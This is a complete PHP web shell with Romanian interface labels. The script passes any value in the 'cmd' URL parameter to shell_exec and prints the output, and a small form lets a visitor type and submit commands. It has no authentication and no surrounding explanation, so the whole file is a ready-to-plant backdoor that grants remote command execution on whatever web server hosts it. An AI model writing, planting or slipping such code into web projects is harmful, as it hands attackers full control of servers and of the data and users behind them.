<?php
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
<form>
    <input type="text" name="cmd" placeholder="Comandă...">
    <button type="submit">Execută</button>
</form>